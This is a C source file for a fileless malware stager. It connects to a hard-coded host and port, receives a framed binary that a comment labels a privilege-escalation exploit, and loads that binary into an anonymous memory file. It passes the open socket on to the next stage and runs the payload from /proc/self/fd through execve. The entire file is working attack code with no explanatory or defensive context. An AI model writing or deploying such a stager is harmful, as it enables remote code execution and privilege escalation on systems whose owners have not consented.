#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define DELIVERY_MAGIC  0xDEADB17D
#define CHAIN_FD        3

static struct {
	uint8_t  marker[4];
	char     ip[16];
	uint16_t port;
	uint8_t  pad[2];
} __attribute__((packed, used)) _stager_conn = {
	.marker = {0xDE, 0xAD, 0xBE, 0xEF},
	.ip     = "10.0.2.2",
	.port   = 4445,
	.pad    = {0, 0},
};

static int recv_exact(int fd, void *buf, size_t n)
{
	char *p = buf;
	while (n > 0) {
		ssize_t r = recv(fd, p, n, 0);
		if (r <= 0) return -1;
		p += r; n -= (size_t)r;
	}
	return 0;
}

int main(void)
{
	int sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock < 0) return 1;

	struct sockaddr_in srv = {0};
	srv.sin_family      = AF_INET;
	srv.sin_addr.s_addr = inet_addr(_stager_conn.ip);
	srv.sin_port        = htons(_stager_conn.port);

	if (connect(sock, (struct sockaddr *)&srv, sizeof(srv)) < 0) return 1;

	/* read first delivery frame — exploit_privesc ELF */
	struct { uint32_t magic; uint32_t size; } hdr;
	if (recv_exact(sock, &hdr, sizeof(hdr)) < 0) return 1;
	if (hdr.magic != DELIVERY_MAGIC) return 1;

	void *mem = mmap(0, hdr.size, PROT_READ|PROT_WRITE,
	                 MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
	if (mem == MAP_FAILED) return 1;
	if (recv_exact(sock, mem, hdr.size) < 0) return 1;

	int mfd = (int)syscall(__NR_memfd_create, "exploit", 0);
	if (mfd < 0) return 1;

	size_t written = 0;
	while (written < hdr.size) {
		ssize_t w = write(mfd, (char *)mem + written, hdr.size - written);
		if (w <= 0) return 1;
		written += (size_t)w;
	}
	munmap(mem, hdr.size);

	/* pin socket to CHAIN_FD so exploit_privesc inherits the connection */
	dup2(sock, CHAIN_FD);
	if (sock != CHAIN_FD)
		close(sock);

	char fd_path[32];
	snprintf(fd_path, sizeof(fd_path), "/proc/self/fd/%d", mfd);

	char *argv[] = { "exploit_privesc", NULL };
	char *envp[] = { NULL };
	execve(fd_path, argv, envp);
	return 1;
}
